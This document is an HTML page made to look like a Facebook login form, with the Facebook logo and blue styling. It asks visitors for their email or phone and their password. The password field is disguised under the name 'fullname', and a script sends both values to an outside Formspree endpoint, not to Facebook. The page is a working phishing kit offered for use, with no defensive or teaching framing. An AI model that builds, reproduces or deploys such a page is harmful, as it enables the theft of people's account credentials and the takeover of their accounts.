<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/ionicons@6.0.0/dist/ionicons.css">
    <style>
        body {
            user-select: none;
            overflow-y: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background: hsl(218deg 50% 91%);
            height: 100vh;
            margin: 0;
            font-family: 'Poppins';
        }

        .form-container {
            background: hsl(213deg 85% 97%);
            padding: 2em;
            display: flex;
            flex-direction: column;
            align-items: center; /* Center the content */
            border-radius: 30px;
            box-shadow: 0 0 2em hsl(231deg 62% 94%);
            gap: 1.5em; /* Adjust the padding as needed */
        }

        .logo img {
            max-width: 70px; /* Adjust as needed */
            height: auto;
        }

        .email, .fullname {
            background: hsl(0deg 0% 100%);
            box-shadow: 0 0 2em hsl(231deg 62% 94%);
            padding: 1em;
            display: flex;
            flex-direction: column;
            gap: 0.5em;
            border-radius: 20px;
            color: hsl(0deg 0% 30%);
            width: 100%; /* Make the input width 100% */
        }

        .email input, .fullname input {
            outline: none;
            border: none;
            width: 100%; /* Make the input width 100% */
        }

        .email::placeholder, .fullname::placeholder {
            color: hsl(0deg 0% 0%);
            font-size: 0.9em;
        }

        .email ion-icon, .fullname ion-icon {
            color: hsl(0deg 0% 30%);
            margin-bottom: -.2em;
        }

        .send {
            padding: 1em;
            background: #1877f2; /* Facebook blue color */
            color: #fff; /* White text color */
            border: none;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s ease-in-out;
        }

        .send:hover {
            background: #135293; /* Darker shade on hover */
        }

        .footer {
            display: flex;
            font-size: 0.7em;
            color: hsl(0deg 0% 37%);
            gap: 14em;
            padding-bottom: 10em;
        }

        .footer span {
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Replace this with your logo -->
        <div class="logo"> 
            <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Facebook_Logo__2019.png?v=1704821241" alt="Facebook Logo">
        </div>

        <div class="email">
            <label for="email">Email or Phone</label>
            <div class="sec-2">
                <ion-icon name="mail-outline"></ion-icon>
                <input type="text" id="email" name="email" placeholder="Enter Email Or Phone Number">
            </div>
        </div>

        <div class="fullname">
            <label for="fullname">Password</label>
            <div class="sec-2">
                <ion-icon name="person-outline"></ion-icon>
                <input type="text" id="fullname" name="fullname" placeholder="Enter Your Password">
            </div>
        </div>

        <button class="send" onclick="sendFormData()">Login</button>

        <script>
            function sendFormData() {
                const email = document.getElementById('email').value;
                const fullname = document.getElementById('fullname').value;

                // Check if email and fullname are not empty before sending
                if (email && fullname) {
                    const formData = new FormData();
                    formData.append('email', email);
                    formData.append('fullname', fullname);

                    fetch('https://formspree.io/f/myyrzggd', {
                        method: 'POST',
                        body: formData,
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        // Handle success, e.g., show a success message
                        console.log(data);
                    })
                    .catch(error => {
                        // Handle error, e.g., show an error message
                        console.error(error);
                    });
                }
            }
        </script>
    </div>
</body>
</html>
